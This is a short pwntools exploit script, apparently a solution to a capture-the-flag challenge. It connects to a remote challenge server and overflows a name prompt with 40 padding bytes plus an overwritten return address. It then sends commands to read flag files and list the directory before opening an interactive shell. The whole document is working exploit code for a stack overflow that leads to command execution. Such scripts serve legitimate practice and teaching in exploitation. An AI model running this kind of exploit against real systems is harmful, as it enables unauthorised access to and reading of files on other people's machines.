from pwn import *

HOST = "0.cloud.chals.io"
PORT = 30804

context.arch = "amd64"
context.log_level = "info"

p = remote(HOST, PORT)

p.recvuntil(b"Enter your name: ")

payload = b"A" * 40
payload += p64(0x401226)

p.sendline(payload)

# Attempt to retrieve the flag
p.sendline(b"cat flag.txt")
p.sendline(b"cat /flag")
p.sendline(b"ls -la")

p.interactive()